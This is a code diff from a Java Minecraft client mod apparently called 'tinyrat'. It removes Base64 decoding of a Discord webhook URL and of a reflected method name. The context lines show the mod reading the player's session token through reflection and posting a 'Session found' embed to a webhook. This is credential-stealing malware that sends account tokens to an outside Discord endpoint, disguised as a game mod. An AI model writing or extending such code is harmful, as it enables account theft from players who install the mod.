@@ -2,7 +2,6 @@ package com.github.tinyrat;
 
 import java.time.ZoneId;
 
-import com.github.tinyrat.utils.Base64Helper;
 import com.github.tinyrat.utils.ConfigLoader;
 import com.github.tinyrat.utils.DiscordEmbed;
 import com.github.tinyrat.utils.DiscordWebhook;
@@ -29,7 +28,7 @@ public class Entry implements ClientModInitializer {
 
     private void sendWebhook() {
         String webhookUrl = ConfigLoader.getWebhook();
-        DiscordWebhook webhook = new DiscordWebhook(Base64Helper.decode(webhookUrl));
+        DiscordWebhook webhook = new DiscordWebhook(webhookUrl);
 
         DiscordEmbed embed = new DiscordEmbed("Session found");
 
@@ -44,7 +43,7 @@ public class Entry implements ClientModInitializer {
 
     private String getTokenViaReflection() {
         try {
-            String methodName = Base64Helper.decode(ConfigLoader.getTokenMethodName());
+            String methodName = ConfigLoader.getTokenMethodName();
 
             return ReflectionHelper.get(this.session, methodName, String.class);
         } catch (Exception e) {
